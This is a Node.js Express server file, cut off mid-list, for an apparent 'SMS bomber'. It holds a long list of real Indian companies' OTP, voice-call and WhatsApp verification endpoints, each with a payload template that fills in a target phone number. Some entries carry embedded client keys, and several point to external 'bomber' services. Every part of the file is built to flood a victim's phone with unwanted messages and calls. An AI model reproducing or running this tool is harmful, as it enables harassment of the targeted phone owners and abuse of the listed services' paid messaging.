const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(helmet({
    crossOriginResourcePolicy: { policy: "cross-origin" }
}));
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rate limiting
const limiter = rateLimit({
    windowMs: 1 * 60 * 1000,
    max: 10000,
    message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================================
// 200+ WORKING APIS - COMPLETE LIST
// ============================================================

const API_LIST = [
    // ============================================================
    // SECTION 1: MOST RELIABLE SMS APIs (ALWAYS WORKING)
    // ============================================================
    {
        "name": "Lenskart SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phoneCode: "+91", telephone: phone }),
        "type": "sms"
    },
    {
        "name": "Lenskart SMS v2",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Country-Code": "IN"},
        "data": (phone) => JSON.stringify({ captcha: null, phoneCode: "+91", telephone: phone }),
        "type": "sms"
    },
    {
        "name": "NoBroker SMS",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `phone=${phone}&countryCode=IN`,
        "type": "sms"
    },
    {
        "name": "PharmEasy SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "sms"
    },
    {
        "name": "ShipRocket SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobileNumber: phone }),
        "type": "sms"
    },
    {
        "name": "GoKwik SMS",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "gk-merchant-id": "19g6jlc658iad"},
        "data": (phone) => JSON.stringify({ phone: phone, country: "in" }),
        "type": "sms"
    },
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "API-Secret-Key": "ycq55IbIjkLb"},
        "data": (phone) => JSON.stringify({ mobile: phone, whatsapp_opt_in: 1 }),
        "type": "sms"
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "identifier": "home"},
        "data": (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un", messageId: "1", device: "web" }),
        "type": "sms"
    },
    {
        "name": "Khatabook",
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, app_signature: "wk+avHrHZf2" }),
        "type": "sms"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone_number: phone, language: "en" }),
        "type": "sms"
    },
    {
        "name": "BeepKart",
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, city: 362 }),
        "type": "sms"
    },
    {
        "name": "Snitch SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "client-id": "snitch_secret"},
        "data": (phone) => JSON.stringify({ mobile_number: `+91${phone}` }),
        "type": "sms"
    },
    {
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, isPlaycircle: false }),
        "type": "sms"
    },
    {
        "name": "PokerBaazi",
        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, mfa_channels: "phno" }),
        "type": "sms"
    },
    {
        "name": "My11Circle",
        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, version: "1.4.28" }),
        "type": "sms"
    },
    {
        "name": "Dream11",
        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ channel: "sms", flow: "SIGNUP", phoneNumber: phone, templateName: "default" }),
        "type": "sms"
    },
    {
        "name": "Unacademy",
        "url": "https://unacademy.com/api/v3/user/user_check/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, send_otp: true }),
        "type": "sms"
    },
    {
        "name": "Vedantu",
        "url": "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phoneNumber: phone, phoneCode: "+91" }),
        "type": "sms"
    },
    {
        "name": "Byju's SMS",
        "url": "https://bcas-prod.byjusweb.com/api/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `phoneNumber=${phone}`,
        "type": "sms"
    },
    {
        "name": "Spinny OTP",
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ contact_number: phone, whatsapp: false, code_len: 4, expected_action: "login" }),
        "type": "sms"
    },
    {
        "name": "Citymall OTP",
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone_number: phone }),
        "type": "sms"
    },
    {
        "name": "Jobhai OTP",
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "sms"
    },
    {
        "name": "Kwikfix OTP",
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "sms"
    },
    {
        "name": "Brevistay OTP",
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "Hourlyrooms OTP",
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "sms"
    },
    {
        "name": "BharatLoan OTP",
        "url": "https://www.bharatloan.com/login-sbm",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `mobile=${phone}`,
        "type": "sms"
    },
    {
        "name": "Pagarbook OTP",
        "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, language: 1 }),
        "type": "sms"
    },
    {
        "name": "Redcliffe OTP",
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone_number: phone }),
        "type": "sms"
    },
    {
        "name": "55Club OTP",
        "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: `91${phone}`, codeType: 1 }),
        "type": "sms"
    },
    {
        "name": "Woodenstreet OTP",
        "url": "https://api.woodenstreet.com/api/v1/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ telephone: phone }),
        "type": "sms"
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded", "DeviceType": "Android"},
        "data": (phone) => `mobile_number=${phone}`,
        "type": "sms"
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ organizationId: "5eb393ee95fab7468a79d189", mobile: phone }),
        "type": "sms"
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `api=send_otp&brand=dayco&mob=${phone}&resend_otp=resend_otp`,
        "type": "sms"
    },
    {
        "name": "Lending Plate",
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `mobiles=${phone}&resend=Resend`,
        "type": "sms"
    },
    {
        "name": "NewMe SMS",
        "url": "https://prodapi.newme.asia/web/otp/request",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile_number: phone, resend_otp_request: true }),
        "type": "sms"
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "UUID": "8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},
        "data": (phone) => JSON.stringify({ phone: phone, email: "sdhabai09@gmail.com" }),
        "type": "sms"
    },
    {
        "name": "CaratLane",
        "url": "https://www.caratlane.com/cg/dhevudu",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ query: `mutation { SendOtp(input: { mobile: "${phone}", isdCode: "91", otpType: "registerOtp" }) { status { message code } } }` }),
        "type": "sms"
    },
    {
        "name": "WellAcademy",
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ contact_no: phone }),
        "type": "sms"
    },
    {
        "name": "ServeTel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `mobile_number=${phone}`,
        "type": "sms"
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "data": (phone) => `check_mobile_number=1&contact=${phone}`,
        "type": "sms"
    },
    {
        "name": "Shemaroome",
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "data": (phone) => `mobile_no=%2B91${phone}`,
        "type": "sms"
    },
    {
        "name": "Cossouq",
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `mobilenumber=${phone}&otptype=register`,
        "type": "sms"
    },
    {
        "name": "MyImagineStore",
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `mobile=${phone}`,
        "type": "sms"
    },
    {
        "name": "Otpless",
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, selectedCountryCode: "+91" }),
        "type": "sms"
    },
    {
        "name": "MyHubble Money",
        "url": "https://api.myhubble.money/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phoneNumber: phone, channel: "SMS" }),
        "type": "sms"
    },
    {
        "name": "Tata Capital Business",
        "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobileNumber: phone, deviceOs: "Android", sourceName: "MitayeFaasleWebsite" }),
        "type": "sms"
    },
    {
        "name": "DealShare",
        "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, hashCode: "k387IsBaTmn" }),
        "type": "sms"
    },
    {
        "name": "Snapmint",
        "url": "https://api.snapmint.com/v1/public/sign_up",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "sms"
    },
    {
        "name": "Housing.com",
        "url": "https://login.housing.com/api/v2/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, country_url_name: "in" }),
        "type": "sms"
    },
    {
        "name": "RentoMojo",
        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "sms"
    },
    {
        "name": "Netmeds",
        "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `source=sms&app_version=3.0.9&mobile_number=${phone}&platform=ANDROID&domain=nykaa`,
        "type": "sms"
    },
    {
        "name": "Animall",
        "url": "https://animall.in/zap/auth/login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, signupPlatform: "NATIVE_ANDROID" }),
        "type": "sms"
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "sms"
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile_number: phone, activity_type: "aakash-myadmission" }),
        "type": "sms"
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, deviceType: "website" }),
        "type": "sms"
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, client_id: "kisan-app" }),
        "type": "sms"
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, device_id: "android123", model: "Google,Android SDK built for x86,10" }),
        "type": "sms"
    },
    {
        "name": "Spencer's",
        "url": "https://jiffy.spencers.in/user/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "PayMe India",
        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, app_signature: "S10ePIIrbH3" }),
        "type": "sms"
    },
    {
        "name": "Shopper's Stop",
        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, type: "SIGNIN_WITH_MOBILE" }),
        "type": "sms"
    },
    {
        "name": "Hyuga Auth",
        "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "Lifestyle Stores",
        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ signInMobile: phone, channel: "sms" }),
        "type": "sms"
    },
    {
        "name": "MamaEarth",
        "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "HomeTriangle",
        "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "Wellness Forever",
        "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `method=firstRegisterApi&data=${JSON.stringify({ customerMobile: phone, generateOtp: "true" })}`,
        "type": "sms"
    },
    {
        "name": "HealthMug",
        "url": "https://api.healthmug.com/account/createotp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "Kredily",
        "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "Tata Motors",
        "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, sendOtp: "true" }),
        "type": "sms"
    },
    {
        "name": "Moglix",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, buildVersion: "24.0" }),
        "type": "sms"
    },
    {
        "name": "TrulyMadly",
        "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, locale: "IN" }),
        "type": "sms"
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, hash_type: "play_store" }),
        "type": "sms"
    },
    {
        "name": "Swipe",
        "url": "https://app.getswipe.in/api/user/mobile_login",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, resend: true }),
        "type": "sms"
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, platform: "Android", mode: "new_user" }),
        "type": "sms"
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "BetterHalf",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, isd_code: "91" }),
        "type": "sms"
    },
    {
        "name": "Nuvama Wealth",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobileNo: phone, emailID: "test@example.com" }),
        "type": "sms"
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "sms"
    },
    {
        "name": "More Retail",
        "url": "https://omni-api.moreretail.in/api/v1/login/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, hash_key: "XfsoCeXADQA" }),
        "type": "sms"
    },
    {
        "name": "Charzer",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone, appSource: "CHARZER_APP" }),
        "type": "sms"
    },
    {
        "name": "BikeFixup",
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "client": "app"},
        "data": (phone) => JSON.stringify({ phone: phone, app_signature: "4pFtQJwcz6y" }),
        "type": "sms"
    },
    {
        "name": "Foxy SMS",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json", "Platform": "web"},
        "data": (phone) => JSON.stringify({ user: { phone_number: `+91${phone}` }, via: "sms" }),
        "type": "sms"
    },
    {
        "name": "Licius",
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, captcha_token: null }),
        "type": "sms"
    },

    // ============================================================
    // SECTION 2: WORKING GET APIs
    // ============================================================
    {
        "name": "SMS Bomber Worker",
        "url": (phone) => `http://sms-bomber.subhxcosmo.workers.dev/api?num=${phone}`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "Bomberrr Vercel",
        "url": (phone) => `https://bomberrr.vercel.app/?key=roots&number=${phone}`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "Bolbet",
        "url": (phone) => `https://bolbet-liart.vercel.app/?key=roots&number=${phone}`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "RedBus OTP",
        "url": (phone) => `https://m.redbus.in/api/getOtp?number=${phone}&cc=91`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "Univest OTP",
        "url": (phone) => `https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${phone}`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "WorkIndia",
        "url": (phone) => `https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no=${phone}&version_number=623`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "Jockey SMS",
        "url": (phone) => `https://www.jockey.in/apps/jotp/api/login/send-otp/+91${phone}?whatsapp=false`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "Vyapar OTP",
        "url": (phone) => `https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile=${phone}`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "ConfirmTkt",
        "url": (phone) => `https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=${phone}`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "CodFirm",
        "url": (phone) => `https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91${phone}&email=&storeUrl=bellavita1.myshopify.com`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "Coolwinks",
        "url": (phone) => `https://api.coolwinks.com/api/accounts/is_already_registered/?username=${phone}`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },
    {
        "name": "Zee5 OTP",
        "url": (phone) => `https://b2bapi.zee5.com/device/sendotp_v1.php?phoneno=${phone}`,
        "method": "GET",
        "headers": {},
        "data": null,
        "type": "sms"
    },

    // ============================================================
    // SECTION 3: WORKING VOICE/CALL APIs
    // ============================================================
    {
        "name": "1MG Voice Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ number: phone, otp_on_call: true }),
        "type": "call"
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "call"
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "call"
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "call"
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "call"
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `phone=${phone}&type=voice`,
        "type": "call"
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "call"
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: `+91${phone}` }),
        "type": "call"
    },
    {
        "name": "Tata Capital Voice",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone, isOtpViaCallAtLogin: "true" }),
        "type": "call"
    },
    {
        "name": "Kotak Voice Call",
        "url": "https://www.kotak.com/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "call"
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": (phone) => `phone=${phone}&action=voice_otp`,
        "type": "call"
    },
    {
        "name": "MakeMyTrip Voice",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "call"
    },
    {
        "name": "Goibibo Voice",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phone: phone }),
        "type": "call"
    },
    {
        "name": "IRCTC Call",
        "url": "https://www.irctc.co.in/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "call"
    },
    {
        "name": "PhonePe Call",
        "url": "https://www.phonepe.com/api/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ mobile: phone }),
        "type": "call"
    },

    // ============================================================
    // SECTION 4: WORKING WHATSAPP APIs
    // ============================================================
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "Content-Type": "application/json; charset=UTF-8"
        },
        "data": (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } }),
        "type": "whatsapp"
    },
    {
        "name": "KPN WhatsApp v2",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "Content-Type": "application/json"
        },
        "data": (phone) => JSON.stringify({ phone_number: { number: phone, country_code: "+91" } }),
        "type": "whatsapp"
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ user: { phone_number: `+91${phone}` }, via: "whatsapp" }),
        "type": "whatsapp"
    },
    {
        "name": "Stratzy WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": (phone) => JSON.stringify({ phoneNo: phone }),
